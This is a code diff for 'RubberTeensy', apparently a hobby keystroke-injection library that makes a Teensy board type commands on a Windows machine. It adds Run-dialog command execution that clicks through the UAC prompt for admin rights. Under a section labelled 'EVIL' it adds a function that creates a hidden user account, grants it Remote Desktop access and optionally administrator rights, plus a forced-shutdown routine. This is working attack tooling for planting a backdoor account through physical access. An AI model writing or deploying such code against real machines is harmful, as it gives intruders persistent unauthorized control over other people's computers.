@@ -62,36 +62,29 @@ void RubberTeensy::OpenCMD(int8_t method, bool admin){
 	Keyboard.begin();
     switch(method) {
 	case 0:
-		if(admin){
-            Keyboard.press(KEY_LEFT_GUI); 
-            delay(_delay*3.0); 
-            Keyboard.release(KEY_LEFT_GUI);
-            delay(_delay*3.0);
-            Keyboard.print("cmd");
-            delay(_delay*3.0); 
+        Keyboard.press(KEY_LEFT_GUI); 
+        delay(_delay*2.0); 
+        Keyboard.release(KEY_LEFT_GUI);
+        delay(_delay*2.0);
+        Keyboard.print("cmd");
+        delay(_delay*2.0); 
+		
+        if(admin){
             Keyboard.press(KEY_LEFT_CTRL); 
             Keyboard.press(KEY_LEFT_SHIFT);
             delay(_delay);
             Keyboard.press(KEY_RETURN);
             Keyboard.releaseAll();
-            delay(_delay);
+            delay(_delay*3.0);
             // Defaults to no in UAC prompt  
             Keyboard.press(KEY_LEFT_ARROW);
-            delay(_delay);
-            Keyboard.press(KEY_RETURN);
-            delay(_delay);
-        } else {
-            Keyboard.press(KEY_LEFT_GUI);
             delay(_delay*3.0);
-            Keyboard.release(KEY_LEFT_GUI);
-            delay(_delay*3.0);
-            Keyboard.print("cmd");
-            delay(_delay*3.0);
-            Keyboard.press(KEY_RETURN); 
-            delay(_delay);
-            Keyboard.release(KEY_RETURN);
-            delay(_delay); 
-        }
+        } 
+
+        Keyboard.press(KEY_RETURN); 
+        delay(_delay);
+        Keyboard.release(KEY_RETURN);
+        delay(_delay); 
         break;	
 	default:
 		// no behaviour 
@@ -107,14 +100,43 @@ void RubberTeensy::OpenCMD(int8_t method, bool admin){
  * 1 - Open the run dialog box and execute the command
  * 2 - Open the run dialog box and run cmd with the command passed in through the /C flag
  * 3 - Write wscript in temp folder then execute with hidden window  
+ * admin - Run the command with admin privileges if supported by method
  */ 
 
-void RubberTeensy::RunCommand(String command, int8_t method){
+void RubberTeensy::RunCommand(const char *command, int8_t method, bool admin){
     switch(method){
     case 0:
-        this->OpenCMD(); 
+        this->OpenCMD(0,admin); 
         this->Write(command);
-        this->Write("exit"); 
+        this->Write("exit");
+        break;  
+    case 1:
+        Keyboard.press(KEY_LEFT_GUI); 
+        delay(_delay);
+        Keyboard.press('r'); 
+        delay(_delay);
+        Keyboard.releaseAll(); 
+        delay(_delay);
+        Keyboard.print(command); 
+        delay(_delay); 
+        if(admin){
+            Keyboard.press(KEY_LEFT_CTRL);
+            Keyboard.press(KEY_LEFT_SHIFT);
+            delay(_delay);
+        } 
+        Keyboard.press(KEY_RETURN);
+        delay(_delay);
+        Keyboard.releaseAll();
+        delay(_delay*3.0);
+        if(admin){
+            Keyboard.press(KEY_LEFT_ARROW);
+            delay(_delay*3.0);
+            Keyboard.press(KEY_RETURN);
+            delay(_delay);
+            Keyboard.releaseAll();
+            delay(_delay);
+        }
+        break;  
     default:
         break; 
     }
@@ -154,10 +176,11 @@ void RubberTeensy::RepeatKey(char key, int repeat){
 void RubberTeensy::Blink(int duration){
     digitalWrite(_LED_Pin, HIGH); 
     delay(duration); 
-    digitalWrite(_LED_Pin, LOW); 
+    digitalWrite(_LED_Pin, LOW);
+    delay(duration); 
 }
 
-void RubberTeensy::Write(String input){
+void RubberTeensy::Write(const char *input){
     Keyboard.print(input); 
     delay(_delay);
     Keyboard.press(KEY_RETURN);
@@ -165,14 +188,34 @@ void RubberTeensy::Write(String input){
     Keyboard.release(KEY_RETURN);
     delay(_delay);
 }
+
 /* ==== EVIL ==== */ 
 
-void RubberTeensy::AddUser(char *username, char *pass, bool admin){
+/* Add a user to the system and attempt to add them to the Remote Desktop Users group. 
+ * username - username
+ * pass - password
+ * admin - whether the user should be added to the Administrator group
+ */ 
 
+void RubberTeensy::AddUser(const char *username, const char *pass, bool admin){
+    char command[100];  
+    snprintf(command, 100, "net user %s %s /ADD", username, pass);  
+    RunCommand(command, 1, 1); // Adding a user requires admin privs
+
+    snprintf(command, 100, "net localgroup 'Remote Desktop Users' %s /ADD", username); // Add user to RDP group 
+    RunCommand(command, 1, 1); 
+    if(admin){
+        // add user to administrator group 
+        snprintf(command, 100, "net localgroup administrators %s /ADD", username); 
+        RunCommand(command, 1, 1); 
+    }
 }
 
-void RubberTeensy::Shutdown(){
-
+/* Shutdown the system after delay seconds */ 
+void RubberTeensy::Shutdown(int delay){
+    char command[50]; 
+    snprintf(command, 50, "shutdown -s -t %d", delay);
+    RunCommand(command, 1, 0);
 }
 
 
